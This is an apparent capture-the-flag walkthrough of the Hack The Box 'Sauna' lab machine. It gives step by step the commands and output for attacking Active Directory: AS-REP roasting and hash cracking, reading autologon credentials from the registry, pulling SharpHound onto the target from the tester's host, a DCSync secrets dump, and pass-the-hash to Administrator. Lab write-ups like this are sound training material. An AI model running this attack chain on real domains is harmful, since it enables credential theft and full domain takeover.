# Sauna
Sauna is a easy HTB lab that focuses on active directory, exploit ASREPRoasting and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

### Reconnaissance
The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.
```
$ sudo nmap -p- -sV -sC 10.129.89.130

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-05 19:24 GMT
Nmap scan report for 10.129.89.130
Host is up (0.026s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-06 02:26:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-06T02:27:01
|_  start_date: N/A
|_clock-skew: 7h00m01s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 204.40 seconds
```

Adding new domains to /etc/hosts found as part of the NMAP scan:
```
sudo tee --append /etc/hosts <<< "10.129.89.130 EGOTISTICAL-BANK.LOCAL0 egotistical-bank.local"
```

We can do the directory HTTP enumeration:
```
[★]$ gobuster dir -u http://10.129.89.130/ -w /opt/useful/SecLists/Discovery/Web-Content/raft-medium-files.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.89.130/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/useful/SecLists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2024/01/05 19:25:55 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 32797]
/contact.html         (Status: 200) [Size: 15634]
/.                    (Status: 200) [Size: 32797]
/about.html           (Status: 200) [Size: 30954]
/blog.html            (Status: 200) [Size: 24695]
/Contact.html         (Status: 200) [Size: 15634]
/Index.html           (Status: 200) [Size: 32797]
/About.html           (Status: 200) [Size: 30954]
/Blog.html            (Status: 200) [Size: 24695]
                                                 
===============================================================
2024/01/05 19:26:11 Finished
===============================================================
```
From the http://10.129.89.130/index.html and http://10.129.89.130/about.html, we were able to get multiple team members at the name.
```
Team members at the bank
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

### User
Generating the user.txt file based on some combinations like first.last first f.last first.l.
```
[★]$ GetNPUsers.py -usersfile users.txt -request -format hashcat -dc-ip 10.129.89.130 'egotistical-bank.local/'

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a084cba0310781dbff350b80d63018e9$5ed9a67bf224c0e914406bae1a12897c13682aa1f3ed7d8415745dff9a6b371430eb18bb992a73288a711173514f6bb686f2da4dc0852ac23bd2148d942d87121a0c3a53189285f13828c61eb089f5603dda7663dc10559e8f351211f591c5924465575b1cc6f57fc17c71980350dedfec44dcf8a715ada6fc263b41b7a7b8932c5ebf9e92bb55739789a7b8ec28b2f618169ef151940e984cfc86fe32170119f40549965a22d0ebadaf684545d4e1ebd8904889b946b26343c1fd8f2df2225d0cedc1ffa7df375463fdb117d53ce323d3f4b79041f17d27da920c207f3cca99f7f5db895929794a37a7be242c0ca8427166ee1af6e251f33e76766d348a2f2f
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Cracking krb5asrep ticket using `$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt` we can get the credentials for username `fsmith`.

Getting the flag:
```
$ evil-winrm -i 10.129.89.130 -u fsmith -p The*******23
*Evil-WinRM* PS C:\Users\FSmith\Documents> type ..\Desktop\user.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation

Enumerating the machine using the WinPEAS.ps1 we got that `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` has the some additional information:
```
*Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
...
DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
...
DefaultPassword    REG_SZ    Mo******************d!
...
```

Got credentials for `svc_loanmanager` username. As we will login again and find that username doesn't work. We did see another username which was similar to this in `C:\Users\` directory.
```
$ curl -L https://github.com/BloodHoundAD/SharpHound/releases/download/v2.3.0/SharpHound-v2.3.0.zip -o SharpHound-v2.3.0.zip; unzip SharpHound-v2.3.0.zip; rm SharpHound-v2.3.0.zip;

$ evil-winrm -i 10.129.89.130 -u 'svc_loanmgr' -p 'Mo******************d!' # Works

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> wget http://10.10.14.119:8000/SharpHound.exe -o SharpHound.exe
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> .\SharpHound.exe
```

`svc_loanmgr` has access to `GetChangesAll` on the domain. Exploit for this - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync

Getting the secrets dump:
```
[★]$ secretsdump.py -just-dc svc_loanmgr:'Mo******************d!'@10.129.89.130 -outputfile dcsync_hashes
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435********ad3b435b51404ee:82345273d************6c7f98e:::
```

Getting the root flag:
```
$ evil-winrm -i 10.129.89.130 -u administrator -H 82345273d************6c7f98e

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
